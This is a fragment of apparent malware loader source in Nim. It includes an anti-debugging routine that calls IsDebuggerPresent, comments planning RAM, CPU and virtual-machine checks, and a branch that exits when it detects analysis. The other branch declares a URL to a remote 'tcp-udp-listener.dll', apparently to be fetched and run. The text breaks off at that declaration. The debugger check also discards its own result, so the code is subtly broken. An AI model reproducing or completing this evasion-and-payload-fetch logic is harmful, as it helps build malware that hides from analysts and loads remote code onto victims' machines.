...
proc isBeingAnalysed(): bool =
    discard winimConverterBOOLToBoolean(IsDebuggerPresent())
    ## add more checks in switch case for RAM, CPU and maybe VM

when isMainModule:
    if isBeingAnalysed():
        # gebrish code goes here ...
        quit(1)
    else:
        var
            url                 : string    = "172.16.180.1:8080/tcp-udp-listener.dll"
